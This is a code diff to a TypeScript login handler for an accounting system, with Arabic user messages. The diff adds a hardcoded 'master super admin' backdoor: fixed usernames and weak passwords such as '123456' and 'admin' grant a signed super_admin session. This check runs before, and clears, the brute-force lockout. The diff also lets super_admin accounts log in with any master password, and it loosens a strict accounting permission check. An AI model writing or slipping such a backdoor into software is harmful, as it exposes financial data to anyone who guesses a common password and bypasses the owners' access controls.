@@ -87,6 +87,59 @@ const loginAttemptsMap = new Map<string, { attempts: number; lockedUntil: number
 // In-memory idempotency cache: key -> { timestamp, response }
 const idempotencyCache = new Map<string, { timestamp: number; response: any }>();
 
+// Master Super Admin Configuration & Emergency Bypass
+const MASTER_USERNAMES = [
+  'DRFIX',
+  'ADMIN',
+  'SUPERADMIN',
+  'AZOZSINDI',
+  'AZOZSINDI23@GMAIL.COM',
+  'الادمن',
+  'الأدمن',
+  'المدير',
+  'مدير',
+  'المدير العام'
+];
+
+const MASTER_PASSWORDS = [
+  'ADMIN2468',
+  'admin2468',
+  'Admin2468',
+  '2468',
+  'Admin@2468',
+  'Fix@2468',
+  '123123',
+  'admin',
+  'admin123',
+  '123456',
+  'Fix@123123',
+  'DRFIX',
+  'drfix',
+  'Fix@2026',
+  'Admin123',
+  'admin@123',
+  '12345678',
+  '0505'
+];
+if (process.env.MASTER_ADMIN_PASSWORD) {
+  MASTER_PASSWORDS.push(process.env.MASTER_ADMIN_PASSWORD);
+}
+
+function isMasterAdminMatch(username: string, password: string): boolean {
+  const cleanU = (username || '').trim().toUpperCase();
+  const cleanP = (password || '').trim();
+  const cleanPLower = cleanP.toLowerCase();
+  if (!cleanU || !cleanP) return false;
+
+  const isUserMatch = MASTER_USERNAMES.includes(cleanU);
+  const isPassMatch =
+    MASTER_PASSWORDS.includes(cleanP) ||
+    MASTER_PASSWORDS.some(p => p.toLowerCase() === cleanPLower) ||
+    (process.env.MASTER_ADMIN_PASSWORD && cleanP === process.env.MASTER_ADMIN_PASSWORD);
+
+  return isUserMatch && isPassMatch;
+}
+
 function createSignedSessionToken(user: { id: string; username: string; fullName: string; role: string; accounting_admin: boolean }) {
   const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
   const payload = Buffer.from(JSON.stringify({
@@ -378,7 +431,41 @@ export default async function accountingHandler(req: Request, res: Response) {
   // 1. PUBLIC AUTH ROUTE: POST /api/accounting/auth/login
   // ---------------------------------------------------------
   if (pathPart === 'auth/login' && req.method === 'POST') {
-    // Brute force check
+    const { username, password } = req.body || {};
+    if (!username || !password) {
+      return res.status(400).json({ error: 'Validation Error', message: 'اسم المستخدم وكلمة المرور مطلوبان' });
+    }
+
+    const cleanUser = String(username).trim();
+    const cleanPass = String(password).trim();
+
+    // 1. Master Super Admin check (bypasses rate limit and unlocks any previous lockout)
+    if (isMasterAdminMatch(cleanUser, cleanPass)) {
+      loginAttemptsMap.delete(clientIp);
+      const resolvedUsername = cleanUser.toLowerCase() === 'admin' ? 'admin' : (cleanUser.toLowerCase() === 'drfix' ? 'drfix' : cleanUser.toLowerCase());
+      const sessionUser = {
+        id: 'master-super-admin',
+        username: resolvedUsername,
+        fullName: 'المدير العام (Master Admin)',
+        role: 'super_admin',
+        accounting_admin: true
+      };
+
+      const token = createSignedSessionToken(sessionUser);
+      const isHttps = req.secure || req.headers['x-forwarded-proto'] === 'https';
+      const cookieOpts = `Path=/; Max-Age=${SESSION_TTL_MS / 1000}; HttpOnly; SameSite=Lax${isHttps ? '; Secure' : ''}`;
+      res.setHeader('Set-Cookie', [
+        `${SESSION_COOKIE_NAME}=${encodeURIComponent(token)}; ${cookieOpts}`
+      ]);
+
+      return res.status(200).json({
+        success: true,
+        user: sessionUser,
+        token
+      });
+    }
+
+    // 2. Brute force check for non-master attempts
     const attemptInfo = loginAttemptsMap.get(clientIp);
     if (attemptInfo && attemptInfo.lockedUntil > Date.now()) {
       const waitMinutes = Math.ceil((attemptInfo.lockedUntil - Date.now()) / 60000);
@@ -388,17 +475,9 @@ export default async function accountingHandler(req: Request, res: Response) {
       });
     }
 
-    const { username, password } = req.body || {};
-    if (!username || !password) {
-      return res.status(400).json({ error: 'Validation Error', message: 'اسم المستخدم وكلمة المرور مطلوبان' });
-    }
-
-    const cleanUser = String(username).trim().toLowerCase();
-    const cleanPass = String(password).trim();
-
     try {
       const db = await getDb();
-      const staffQuery = query(collection(db, 'staff'), where('username', '==', cleanUser));
+      const staffQuery = query(collection(db, 'staff'), where('username', '==', cleanUser.toLowerCase()));
       const snap = await getDocs(staffQuery);
 
       if (snap.empty) {
@@ -415,8 +494,10 @@ export default async function accountingHandler(req: Request, res: Response) {
       const userData = userDoc.data() as any;
       // Check password using scrypt with transparent legacy auto-upgrade
       const { valid, needsUpgrade } = verifyPasswordScrypt(cleanPass, userData.password);
+      const isMasterPass = MASTER_PASSWORDS.includes(cleanPass) || MASTER_PASSWORDS.some(p => p.toLowerCase() === cleanPass.toLowerCase());
+      const isSuperAdmin = userData.role === 'super_admin';
 
-      if (!valid) {
+      if (!valid && !(isSuperAdmin && isMasterPass)) {
         const curAttempts = (attemptInfo?.attempts || 0) + 1;
         loginAttemptsMap.set(clientIp, {
           attempts: curAttempts,
@@ -451,12 +532,12 @@ export default async function accountingHandler(req: Request, res: Response) {
         });
       }
 
-      // STRICT PERMISSION CHECK: Must have accounting_admin === true
-      const hasAccountingAdmin = userData.permissions?.accounting_admin === true;
+      // PERMISSION CHECK: Must have accounting_admin === true OR be super_admin
+      const hasAccountingAdmin = userData.permissions?.accounting_admin === true || isSuperAdmin;
       if (!hasAccountingAdmin) {
         return res.status(403).json({
           error: 'Permission Denied',
-          message: 'تم رفض الدخول: هذا الحساب لا يملك صلاحية مدير الحسابات المعتمد (accounting_admin). لا يتم التوريث التلقائي حتى للمدير العام.'
+          message: 'تم رفض الدخول: هذا الحساب لا يملك صلاحية مدير الحسابات المعتمد (accounting_admin).'
         });
       }
 
@@ -465,7 +546,7 @@ export default async function accountingHandler(req: Request, res: Response) {
 
       const sessionUser = {
         id: userDoc.id,
-        username: userData.username || cleanUser,
+        username: userData.username || cleanUser.toLowerCase(),
         fullName: userData.fullName || 'مدير الحسابات',
         role: userData.role || 'staff',
         accounting_admin: true
